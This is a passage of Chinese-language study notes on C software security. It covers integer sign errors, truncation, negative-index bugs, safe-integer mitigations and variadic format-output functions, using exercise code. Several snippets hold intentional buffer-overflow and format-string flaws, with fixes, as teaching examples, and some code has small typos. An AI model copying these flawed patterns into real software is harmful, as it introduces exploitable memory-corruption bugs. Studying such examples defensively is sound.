<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> BUFF_SIZE 10</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"><span class="comment">// 程序接受两个参数：将要被复制的字符串和它的长度</span></span><br><span class="line"><span class="type">int</span> len; <span class="comment">// len被声明为带符号整型</span></span><br><span class="line"><span class="type">char</span> buf[BUFF_SIZE];</span><br><span class="line">len = atoi(argv[<span class="number">1</span>]); <span class="comment">// argv[1]也可以是一个负值</span></span><br><span class="line"><span class="keyword">if</span> (len &lt; BUFF_SIZE)&#123; <span class="comment">// 一个负值能够绕过该检测</span></span><br><span class="line"><span class="built_in">memcpy</span>(buf, argv[<span class="number">2</span>], len); <span class="comment">// 值被认为是无符号的size_t类型</span></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>变量len在第3行被声明为<strong>带符号整型</strong>，这就决定了它在第5行被赋值时<strong>可能会得到一个负值</strong>。<strong>负值可以绕过第6行的检查</strong>，因为小于设定的缓冲区（BUFF_SIZE）长度。在第7行对memcpy()的调用中，这个带符号整数被视作一个size_t类型的无符号整数。这就导致了一个符号错误，<strong>因为负的长度值(len)被解释为一个很大的正整数，从而导致缓冲区溢出。</strong></li>
<li>这个漏洞可以<strong>通过限制整数len为一个有效值</strong>来避免：</li>
</ul>
<p><strong>①加设一个更有效的范围校验</strong>以保证len的值在0到BUFF_SIZE之间<strong>（0&lt;len&lt;BUFF_SIZE）</strong></p>
<p><strong>②声明为无符号整型</strong>：消除在调用函数memcpy()时<strong>从带符号整型到无符号整型的转换、防止发生符号错误。</strong></p>
<p>4.截断：漏洞执行</p>
<p>练习题：<strong>整数截断导致缓冲区溢出</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *name, <span class="type">long</span> cbBuf)</span> &#123;</span><br><span class="line"><span class="comment">// cbBuf用户初始化用于分配buf内存的bufSize</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> bufSize = cbBuf;</span><br><span class="line"><span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(bufSize);</span><br><span class="line"><span class="keyword">if</span> (buf) &#123;</span><br><span class="line"><span class="built_in">memcpy</span>(buf, name, cbBuf); </span><br><span class="line"><span class="comment">// cbBuf被声明为long用于设定memcpy()操作中的大小参</span></span><br><span class="line"><span class="keyword">if</span> (buf) <span class="built_in">free</span>(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（1）<strong>cbBuf</strong>被临时保存在了一个unsigned short bufsize中。不论是GCC还是Visucal C++，在基于IA-32的编译器上，unsigned short的最大值都是65535。而同一平台上signed long的最大值是2147483647。任何值位于<strong>65535和2147483647之间</strong>的cbBuf在进行赋值时<strong>都会发生截断错误。</strong></p>
<p>（2）当bufSize同时用于调用malloc()和memcpy()的时候，<strong>只会发生错误并不会产生漏洞。</strong></p>
<p>（3）由于bufSize被用于分配缓冲区的大小，而cbBuf则是用来在调用函数memcpy()时指定大小，因此任何<strong>在1到2147418112(2147483647-65535)字节之间</strong>的buf值<strong>都会引起溢出。</strong></p>
<p>（4）假设unsigned short的最大值为a，signed long的最大值是b。由于bufSize被用于分配缓冲区的大小，而cbBuf则是用来在调用函数memcpy()的指定大小，因此，任何<strong>在a+1到b字节之间</strong>的buf值<strong>都会引起溢出。</strong></p>
<p>5.非异常的整数逻辑错误</p>
<p><strong>（1）许多可利用的软件缺陷并不完全需要一个异常条件</strong>(比如整数溢出)。</p>
<p>（2）负数索引</p>
<p>（3）考试题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *table = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">insert_in_table</span><span class="params">(<span class="type">int</span> pos, <span class="type">int</span> value)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!table) &#123;</span><br><span class="line">table = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">100</span>);</span><br><span class="line"><span class="comment">// 从堆中分配存储空间给数组</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pos &gt; <span class="number">99</span>) &#123; <span class="comment">// pos小于99</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">table[pos] = value; <span class="comment">// value被插入数组的指定位置</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>如果pos是负值，value将被写入缓冲区pos*4字节之前的位置</strong></li>
<li>漏洞：<strong>对插入位置pos缺乏必要的范围检查，</strong>因此将会导致一个漏洞。因为pos开始时被声明为<strong>带符号整数</strong>，即传递到函数中的值<strong>可正可负</strong>。可以捕获下标越界的正值，但是负值却不会被捕获。</li>
<li>可以通过<strong>在判断pos&gt;99之前同时加入pos&lt;0的判断</strong>修复该漏洞。</li>
</ul>
<p>6.其他C99整数类型</p>
<p>（1）下面的类型有特定的用处：</p>
<p><strong>①ptrdiff_t</strong>为表示两指针相减的结果的带符号整型；size_t是表示sizeof操作符结果的无符号整型。</p>
<p><strong>②wchar_t</strong>的取值范围可以表示所支持的现场（locales）中最大扩展字符集中的所有字符代码。</p>
<p>（2）介绍案例</p>
<p>考试题代码：指出存在问题</p>
<p><strong>未检查argc是否≥3，直接访问argv[1]和argv[2]存在空指针风险。</strong></p>
<p><strong>未检查malloc返回值是否为NULL，可能导致对空指针写入数据而崩溃。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *<span class="type">const</span> *argv)</span> &#123;</span><br><span class="line"><span class="comment">// 接受两个字符串类型的参数并且计算它们的总长度（加上结尾空字符占用的1个额外的字节）</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> total;</span><br><span class="line">total = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> *buff = (<span class="type">char</span> *) <span class="built_in">malloc</span>(total);</span><br><span class="line"><span class="comment">// 分配足够的内存来存储两个字符</span></span><br><span class="line"><span class="built_in">strcpy</span>(buff, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">strcat</span>(buff, argv[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">// 首先将第一个参数复制到缓冲区中，然后将第二个参数连接在其尾部</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>漏洞：攻击者可能会<strong>提供两个总长度无法用unsigned short整数total表示的字符串做参数</strong>strlen()函数返回<strong>一个size_t类型，一个IA-32上的unsigned long int</strong>。因此，lengths+1的和是一个unsigned long int。分配给unsigned short int total时值必须被截断。一旦长度的总和大于结果类型的表示范围，它将会被截模截断。</li>
<li>攻击者可能会提供两个总长度<strong>无法用unsigned short整数total表示的字符串</strong>做参数。这样，一旦长度的<strong>总和大于结果类型的表示范围</strong>，它将会被<strong>取模截断</strong>。举例来说，如果第一个参数的长度是65500个字符，第二个参数的长度是36个字符，那么它们的长度<strong>总和加1将是65537个字符</strong>。函数strlen()被定义成返回一个类型size_t的结果，通常就是一个unsigned long。<strong>由于65500和36都是unsigned long，三个值的和也必然是unsigned long。</strong>而将一个unsigned long赋值给一个unsigned short型的变量total，必然要进行降级操作。假设short是16位，则上述运算的结果是(65500+37)%65536&#x3D;1。根据这个结果，<strong>函数malloc()能够成功地分配所需的字节（即1个</strong>），但是该分配为strcpy()和strcat()的执行创造了缓冲区溢出条件。</li>
</ul>
<p>7.NetBSD例子</p>
<p>（1）NetBSD 1.4.2及之前的版本中都使用了以下形式的整数范围检查：**if(off&gt;lensizeof(type-name)) goto error;**这里的off和len都是带符号整型。</p>
<p>（2）漏洞：sizeof操作符返回的是一个无符号整型(<strong>size_t</strong>)，因此整数提升规则要求<strong>len-sizeof(类型名)。</strong>应该按照<strong>无符号整型计算，</strong>当len小于sizeof的返回值时：<strong>减法</strong>操作造成<strong>下溢</strong>并产生一个<strong>很大的正值</strong>，整数范围检查<strong>逻辑被绕过。</strong></p>
<p>（3）利用：一种能够消除此类问题的替代形式的整数范围检查：<strong>if ((off+sizeof(type-name))&gt;len) goto error;<strong>程序员仍然必须保证off的值在一个定义的范围之内，以确保</strong>加法操作不会导致溢出。</strong></p>
<h3 id="缓解策略-1"><a href="#缓解策略-1" class="headerlink" title="缓解策略"></a>缓解策略</h3><p>1.范围检查</p>
<p>（1）<strong>如果适当地运用类型范围检查</strong>，就够<strong>消除所有的整型漏洞</strong>。<strong>（第一条防线）</strong>诸如Pascal或者Ada这些语言，允许对任何标量类型应用范困限制，以形成子类型。</p>
<p>（2）以Ada为例，允许使用range关键字来声明对派生类型的范围约束type day is new INTEGER range 1..31;范围约束会被语言运行时强制执行，C和C++在强制类型安全性方面并不擅长。</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFF_SIZE 10</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// 隐式类型俭查是将len声明为无符号整数而实现的</span></span><br><span class="line"><span class="type">char</span> buf[BUFF_SIZE];</span><br><span class="line">len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> ((<span class="number">0</span>  &lt;len)&amp;&amp;(len &lt; BUFF_SIZE))&#123; <span class="comment">// 显式范围检查数组的上下界</span></span><br><span class="line"><span class="built_in">memcpy</span>(buf, argv[<span class="number">2</span>], len);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(“too much data\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>当<strong>len ≥ BUFF_SIZE</strong>时，可以绕过范围检测导致缓冲区溢出错误，可以通过<strong>使用strncpy函数</strong>避免。</li>
</ul>
<p>2.范围检查解释</p>
<p>（1）<strong>仅仅将len声明为无符号整数并不足以完成范围约束，因为它只能约束从0到MAX_INT的范围</strong>。<strong>检查上下界</strong>，确保不会将越界的值传递给memcpy()。同时使用隐式和显式检查看上去有些累赘，但是<strong>我们推荐</strong>这种健康的偏执式的编程实践。</p>
<p>（2）所有外部输入的数据<strong>都要进行上下界检查</strong>：应该<strong>通过接口来强制执行</strong>对它们的限制。任何<strong>能够限制过大或过小输入</strong>的措施，都有助于防止溢出和其他类型范围错误。</p>
<p>（3）排版约定：<strong>区分代码中的常量和变量</strong>，区分<strong>受外部影响的变量和拥有良好定义范围的局部变量。</strong></p>
<p>3.强类型：提供更好的类型检查的方式之一是<strong>提供更好的类型定义。</strong>将一个变量<strong>声明为无符号的类型</strong>就能够保证该变量不会包含负值。<strong>这种解决方案不能阻止溢出。</strong></p>
<p>4.抽象数据类型：解决方案之一是<strong>创建一个包含私有数据成员waterTemperature的抽象类型，用户不能直接访问该数据成员</strong>。这些方法中<strong>必须提供类型安全机制</strong>，以保证waterTemperature的值在有效范围之内。如果正确地做到了这一点，<strong>就不可能再发生整型范围错误了。</strong></p>
<p>5.Visual C++编译器检查</p>
<p>（1）当一个整数值<strong>被赋给较小的整型时</strong>，Visual C++ NET 2003编译器会<strong>生成一个警告。</strong></p>
<p>（2）在警告级别1，如果类型为_int64的值被赋值给unsigned int类型。在警告级别3和4，如果一个整型被转换给一个较小的整型将会生成“可能会丢失数据”警告。在警告级别4下，以下例子中的赋值就会生成一个C4244警告。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line"><span class="type">short</span> a = b + c; <span class="comment">// C4244</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>6.Visual C++运行时检查</p>
<p>（1）当一个整数值<strong>被赋给较小的整型时</strong>，Visual C++ NET 2003编译器会<strong>生成一个警告。</strong></p>
<p>（2）&#x2F;RTCc提供了与C4244警告类似的功能，以报告当一个整数被赋值给较小的整型时所导致的数据丢失。</p>
<p>（3）Visual C++中还包含一个runtime_checks pragma，用于禁用或启用／RTC设置，但它并不包括用于捕获其他运行时错误（例如溢出）的标志。</p>
<p>7.加带符号的整数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Wtype __addvsi3 (Wtype a, Wtype b) &#123;</span><br><span class="line"><span class="comment">// gcc运行时系统的一个函数，用于检测带符号16位整数加操作导致的溢出。</span></span><br><span class="line"><span class="type">const</span> Wtype w = a + b;</span><br><span class="line"><span class="keyword">if</span> (b &gt;= <span class="number">0</span> ? w &lt; a : w &gt; a)</span><br><span class="line"><span class="comment">// 加操作被执行，结果与操作数相比较以判断是否发生了溢出。</span></span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line"><span class="comment">// abort()被调用，如果b非负且w&lt;a，b为负数并且w&gt;a。</span></span><br><span class="line"><span class="keyword">return</span> w;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>8.安全的整数操作</p>
<p>（1）整数操作可能会导致溢出和数据丢失。防止整数漏洞的第一条防线就是<strong>进行范围检查：</strong>显式、隐式-通过使用强类型达。很难保证多个输入变量不被恶意用户操纵，从而导致程序中的某些操作出错。</p>
<p>（2）另一种可选的或者说是辅助的方式是将每一个操作保护起来。这属于一种劳动密集型的方式，<strong>实现起来代价很大。</strong>让输入可能被不确定来源所影响的所有整数操作都使用一个安全整数库。</p>
<p>9.无符号的加函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">in <span class="type">bool</span> <span class="title function_">UAdd</span><span class="params">(<span class="type">size_t</span> a, <span class="type">size_t</span> b, <span class="type">size_t</span> *r)</span> &#123;</span><br><span class="line"><span class="keyword">asm</span> &#123;</span><br><span class="line">mov eax, dword ptr [a] </span><br><span class="line">add eax, dword ptr [b] </span><br><span class="line">mov ecx, dword ptr [r] </span><br><span class="line">mov dword ptr [ecx], eax </span><br><span class="line">jc <span class="type">short</span> j1</span><br><span class="line">mov al, <span class="number">1</span> <span class="comment">// 1 is success</span></span><br><span class="line">jmp <span class="type">short</span> j2</span><br><span class="line">j1:</span><br><span class="line">xor al, al <span class="comment">// 0 is failure</span></span><br><span class="line">j2:</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *<span class="type">const</span> *argv)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> total;</span><br><span class="line"><span class="keyword">if</span> (UAdd(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]), <span class="number">1</span>, &amp;total) &amp;&amp;</span><br><span class="line">Uadd(total, <span class="built_in">strlen</span>(argv[<span class="number">2</span>]), &amp;total)) &#123;</span><br><span class="line"><span class="comment">// 调用函数UAdd()来计算两个字符串长度的总和时，使用了适当的错误检查机制</span></span><br><span class="line"><span class="type">char</span> *buff = (<span class="type">char</span> *)<span class="built_in">malloc</span>(total);</span><br><span class="line"><span class="built_in">strcpy</span>(buff, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">strcat</span>(buff, argv[<span class="number">2</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>10.SafeInt类</p>
<p>（1）<strong>在执行操作之前</strong>对操作数的值进行测试，以决定是否会导致错误。</p>
<p>由于这个类<strong>被声明为模板类</strong>，因此<strong>可以用于任何整数类型。</strong>重截了几乎每一个有关的操作符。（{}下标索引操作符除外）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *<span class="type">const</span> *argv)</span> &#123;</span><br><span class="line">try&#123;</span><br><span class="line">SafeInt&lt;<span class="type">unsigned</span> <span class="type">long</span>&gt; <span class="title function_">s1</span><span class="params">(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]))</span>;</span><br><span class="line"><span class="comment">// 变量s1和s2分别被声明为Safelnt类型</span></span><br><span class="line">SafeInt&lt;<span class="type">unsigned</span> <span class="type">long</span>&gt; <span class="title function_">s2</span><span class="params">(<span class="built_in">strlen</span>(argv[<span class="number">2</span>]))</span>;</span><br><span class="line"><span class="type">char</span> *buff = (<span class="type">char</span> *) <span class="built_in">malloc</span>(s1 + s2 + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(buff, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">strcat</span>(buff, argv[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line">catch(SafeIntException err) &#123;</span><br><span class="line"><span class="comment">// 调用+操作符时，使用的是Safelnt类提供的安全版本的＋操作符。这个安全版本的操作符保证，倘若结果无效则抛出一个异常</span></span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（2）整数安全解决方案对比：与Howard方法相比，Safelnt库有好几个优点。</p>
<p>①比依赖于汇编语言指令实现务全算术操作的Howard方法移植性更好</p>
<p>②<strong>更好的可用性</strong>：算术操作符可以用于常规的内联表达式、Safelnt使用C++异常处理机制代替C风格的返回代码检查。</p>
<p>③<strong>更好的性能表现</strong>(对于启用优化编译选项的应用程序而言)</p>
<p>12.整数安全库使用</p>
<p>（1）什么时候使用：<strong>让输入可能被不确定来源所影响的所有整数操作都使用一个安全整数，</strong>比如结构大小、分配的结构的个数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">CreateStructs</span><span class="params">(<span class="type">int</span> StructSize, <span class="type">int</span> HowMany)</span> &#123;</span><br><span class="line"><span class="comment">// 函数有两个参数，一个指定了给定结构的大小，一个指定了由非可信来源所能操纵的、应分配的结构的个数．这两个值的乘积决定了所分配的内存大小</span></span><br><span class="line">SafeInt&lt;<span class="type">unsigned</span> <span class="type">long</span>&gt; <span class="title function_">s</span><span class="params">(StructSize)</span>;</span><br><span class="line">s *= HowMany; <span class="comment">// 乘法操作很容易引起整型变量的溢出，同时也为缓冲区溢出提供了机会</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">malloc</span>(s.Value());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（2）什么时候不使用：不需要使用安全整数进行操作。<strong>被紧密控制的循环、变量不受外部影响。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span> a[INT_MAX];</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; INT_MAX; i++)</span><br><span class="line">a[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<aside>
📔

<p><strong>总结</strong></p>
<p>（1）整数漏洞<strong>自数据丢失或者错误的表示</strong>所产生。当整数操作产生了一个<strong>超过其特定整型范围的值</strong>的时候，就会发生<strong>整数溢出</strong>。当一个值<strong>存储在一个太小的类型</strong>里，以至于<strong>无法表示其结果</strong>的时候，就会发生<strong>截断</strong>。标志错误源于<strong>符号位的误解，但不会导致数据的丢失。</strong></p>
<p>（2）防止这些整数漏洞发生的关键在于理解数字系统中<strong>这些整数行为的细微差异。限制整数的输入</strong>使其处于一个有效的范围内，可以阻止那些可能引起整数类型溢出的非常大或非常小的数掘进入系统。很多整数输入<strong>都定义有明确的范围</strong>，其他的整数则拥有一个<strong>合理的上下限</strong>。</p>
<p>（3）确保对整数的操作不会造成整数错误需要周详的考虑。一如既往地利用现有的工具、过程和技术来发现和防止整数漏洞是非常有意义的。<strong>静态分析和代码审核对于发现错误非常有效，源代码审核</strong>还为开发者提供了一种论坛，用来讨论什么会、什么不会造成安全缺陷，并考虑可能的解决方案。</p>
<p>（4）<strong>动态分析工具与测试相结合</strong>使用，可以用作<strong>质量保证过程</strong>的一部分，尤其是当边界条件可被正确地评估出来的时候。如果正确地应用了<strong>整数类型范围检查</strong>，并且对<strong>某些可能超出范围的值</strong>（尤其是因为来自外部的操作）采用<strong>安全整数操作</strong>，完全有可能<strong>避免由整数范围错误所导致的漏洞。</strong></p>
</aside>

<h2 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a><strong>格式化输出</strong></h2><h3 id="格式化输出相关知识"><a href="#格式化输出相关知识" class="headerlink" title="格式化输出相关知识"></a>格式化输出相关知识</h3><p>格式化输出的简介</p>
<p>（1）格式化输出函数参数<strong>由一个格式字符串和可变数目的参数</strong>构成</p>
<p>①格式化字符串提供了一组可以<strong>由格式化输出函数解释执行的指令</strong></p>
<p>②用户可以通过<strong>控制格式字符串的内容来控制格式化输出函数的执行</strong></p>
<p>（2）变参函数在C语言中实现的局限性导致格式化输出函数的<strong>使用中容易产生漏洞。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">char</span> *pname)</span> &#123; </span><br><span class="line"><span class="comment">// pname的运行时值将替换格式字符串中的%d从而构造用法usage字符串</span></span><br><span class="line"><span class="type">char</span> usageStr[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">snprintf</span>(usageStr, <span class="number">1024</span>,<span class="string">&quot;Usage: %s &lt;target&gt;\n&quot;</span>,pname); </span><br><span class="line"><span class="comment">// 调用printf()函数输出usage信息</span></span><br><span class="line"><span class="built_in">printf</span>(usageStr); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">usage(argv[<span class="number">0</span>]); </span><br><span class="line"><span class="comment">// 程序的实际名字由用户输入（argv[0]）并作为参数传递给usage()函数</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>); &#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="变参函数"><a href="#变参函数" class="headerlink" title="变参函数"></a>变参函数</h3><p>1.ANSI C标准参数</p>
<p>（1）在ANSI C的标准参数方式（也称为stdargs）中，变参函数是通过使用<strong>一个部分参数列表后跟一个省略号进行声明的。</strong>若要调用一个变参函数，仅需指定该次调用中所需数目的参数即可：average(3,5,8,-1);</p>
<p>（2）使用stdargs实现average()函数</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">average</span><span class="params">(<span class="type">int</span> first, ...)</span> &#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>, sum = <span class="number">0</span>, i = first;</span><br><span class="line">va_list marker;</span><br><span class="line">va_start(marker, first); </span><br><span class="line"><span class="keyword">while</span> (i != <span class="number">-1</span>) &#123;</span><br><span class="line">sum += i;</span><br><span class="line">count++;</span><br><span class="line">i = va_arg(marker, <span class="type">int</span>);</span><br><span class="line">&#125;</span><br><span class="line">va_end(marker); </span><br><span class="line"><span class="keyword">return</span>(sum ? (sum / count) : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（3）变参函数<strong>average()接受一个独立的定参，其后跟着一个变参列表</strong>。对该变参列表中的参数不会执行任何类型检查。省略号之前通常有一个或多个定参，而省略号则必须出现在参数列表的最后。</p>
<p>（4）ANSI C为了实现变参函数所提供的宏，va_start(), va_arg()和va_end()的定义。这些定义在头文件stdarg.h中的宏，全部作用于va_list数据类型以及使用va_list类型声明的参数列表之上。</p>
<p>2.可变参数宏定义示例</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _ADDRESSOF(v) (&amp;(v))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _INTSIZEOF(n) \</span></span><br><span class="line"><span class="meta">((sizeof(n)+sizeof(int)-1) &amp; ~(sizeof(int)-1))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> *va_list; <span class="comment">// 变量maker被声明为va_list类型</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_start(ap,v) </span></span><br><span class="line"><span class="comment">// 在使用变量marker之前，首先必须调用va_start()对它进行初始化</span></span><br><span class="line"><span class="comment">// 调用了va_start()并且传递参数marker以及最后一个定参（first）</span></span><br><span class="line">(ap=(va_list)_ADDRESSOF(v)+_INTSIZEOF(v))</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_arg(ap,t) (*(t *)((ap+=_INTSIZEOF(t))-_INTSIZEOF(t)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_end(ap) (ap = (va_list)0)</span></span><br></pre></td></tr></table></figure>

<p>（1）宏va_arg()需要一个<strong>已初始化的va_list</strong>和<strong>下一个参数的类型</strong>。这个宏可以根据这些信息返回下一个参数的值，并且相应地递增参数指针。</p>
<p>（2）average()第8行调用va_arg()宏，通过循环，获取第2个直至最后一个参数。最后，在函数返回之前，调用va_end()来执行清理工作。</p>
<p>（3）参数列表的终止条件是函数的实现者和使用者之间的一个契约。在函数average()的实现中，变参列表的终止是由一个值为-1的参数所指定的。</p>
<p>（4）如果程序员在调用该函数时忘记传入这个特殊的参数，则函数将继续处理下一个参数，直到遇到-1或者发生异常为止。</p>
<p>3.采用字符指针定义的va_list类型</p>
<p>（1）（练习题代码）在这些系统中调用函数average(3,5,8,-1)时，参数被如何按序安排在栈上。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2080.png" alt="image.png"></p>
<p>（2）在用va_start()初始化字符指针后，字符指针指向<strong>最后一个定参之后的那个参数</strong>。va_start()宏将该参数的（类型）大小加上最后一个定参的地址。当va_start()返回时，va_list将指向<strong>第一个可选参数的地址。</strong></p>
<p>（3）并不是所有系统都把va_list类型定义成字符指针。一些系统将其定义成<strong>指针数组</strong>，另外一些系统则把它<strong>放在寄存器中作为参数传递</strong>。当参数在寄存器中传递时，va_start()可能不得不为它们分配内存空间。宏va_end()就被<strong>用来释放分配的内存空间。</strong></p>
<p>7.使用varargs实现的average()函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">average</span><span class="params">(va_alist)</span> va_dcl &#123;</span><br><span class="line"><span class="type">int</span> i, count, sum;</span><br><span class="line">va_list marker;</span><br><span class="line"><span class="comment">// Unix System V的宏（定义于varargs.h中）的运作方式稍微不同于ANSI标准参数</span></span><br><span class="line">va_start(marker); </span><br><span class="line"><span class="keyword">for</span> (sum = count = <span class="number">0</span>; </span><br><span class="line">(i = va_arg(marker, <span class="type">int</span>)) != <span class="number">-1</span>; count++)</span><br><span class="line">sum += i;</span><br><span class="line">va_end(marker); </span><br><span class="line"><span class="keyword">return</span>(sum ? (sum / count) : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="格式化输出函数"><a href="#格式化输出函数" class="headerlink" title="格式化输出函数"></a>格式化输出函数</h3><p>1.格式化输出函数</p>
<p>（1）fprintf()按照<strong>格式字符串的内容将输出写入流中</strong>。<strong>流、格式字符串和变参列表</strong>一起作为参数提供给函数。</p>
<p>（2）printf()等同于fprintf()，除了前者假定<strong>输出流为stdout外。</strong></p>
<p>（3）sprintf()等同于fprintf()，但是<strong>输出不是写入流而是写入数组中</strong>。</p>
<p>（4）snprintf()等同于sprintf()，但是它指定了<strong>可写入字符的最大值n。超出部分会被舍弃，并且字符末尾会加上空字符。</strong></p>
<p>（5）这些函数受到格式化字符串限制。<strong>当参数过多时，直接省略</strong>；参数过少时，结果未定义（会访问栈中原内容当作参数）。</p>
<p>2.相同的函数：vfprintf()、fprintf()；vprintf()、printf()；vsprintf()、sprintf()；vsnprintf()、snprintf()。当参数列表是在运行时决定时，这些函数非常有用。</p>
<p>3.格式字符串</p>
<p>（1）格式字符串是<strong>由普通字符（包括%）和转换规范构成的</strong>字符序列。</p>
<p>（2）普通字符<strong>被原封不动地复制到输出流中。</strong></p>
<p>（3）转换规范根据与实参对应的<strong>转换指示符</strong>对其进行转换，然后将结果写入输出流中。</p>
<p>（4）转换规范通常<strong>以%开始</strong>按照<strong>从左向右</strong>的顺序解释。</p>
